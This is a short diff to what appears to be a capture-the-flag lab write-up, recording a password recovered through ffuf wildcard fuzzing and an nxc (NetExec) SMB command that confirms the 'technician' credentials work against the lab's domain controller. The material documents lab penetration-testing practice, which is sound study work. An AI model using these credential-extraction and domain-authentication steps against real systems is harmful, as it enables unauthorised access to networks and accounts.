@@ -339,7 +339,19 @@ Ill keep running ffuf for this but every new character found will be placed befo
 
 ![](Pasted%20image%2020261111193332.png)
 
-And this is the complete password, i know this since it no longer requires the `*` to return the te
+And this is the complete password, i know this since it no longer requires the `*` to return the technician account
+
+# Domain user compromise
+
+```python
+❯❯❯ nxc smb dc-analysis.analysis.htb -u 'technician' -p '97NTtl*4QP96Bv'
+SMB         10.129.230.179  445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv
+```
+
+This password also works on the domain
+
+
 
 
 
